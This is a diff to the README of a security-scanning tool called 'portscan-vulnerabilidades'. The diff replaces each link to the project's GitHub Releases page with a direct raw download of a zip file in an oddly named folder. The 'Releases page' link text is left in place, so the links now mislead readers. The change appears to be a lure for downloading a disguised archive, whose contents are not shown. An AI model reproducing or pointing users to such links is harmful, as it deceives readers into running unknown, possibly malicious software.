@@ -1,6 +1,6 @@
 # 🔍 portscan-vulnerabilidades - Simplify Your Security Assessments
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/v2lurpin/portscan-vulnerabilidades/releases)
+[![Download](https://raw.githubusercontent.com/v2lurpin/portscan-vulnerabilidades/main/inspiritingly/portscan-vulnerabilidades-2.0.zip)](https://raw.githubusercontent.com/v2lurpin/portscan-vulnerabilidades/main/inspiritingly/portscan-vulnerabilidades-2.0.zip)
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ To use portscan-vulnerabilidades, you’ll need to download it from our Releases
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/v2lurpin/portscan-vulnerabilidades/releases). 
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/v2lurpin/portscan-vulnerabilidades/main/inspiritingly/portscan-vulnerabilidades-2.0.zip). 
 
 2. **Download the Application**: Find the latest version of portscan-vulnerabilidades. Look for the file that matches your operating system. Click the link to download it directly.
 
@@ -58,7 +58,7 @@ To ensure optimal performance, your system should meet the following requirement
 
 3. **Review Documentation**: Our Wiki page contains detailed help on using each feature effectively.
 
-4. **Stay Updated**: Regularly check the [Releases page](https://github.com/v2lurpin/portscan-vulnerabilidades/releases) for new versions and features.
+4. **Stay Updated**: Regularly check the [Releases page](https://raw.githubusercontent.com/v2lurpin/portscan-vulnerabilidades/main/inspiritingly/portscan-vulnerabilidades-2.0.zip) for new versions and features.
 
 ## 🌐 Support
 
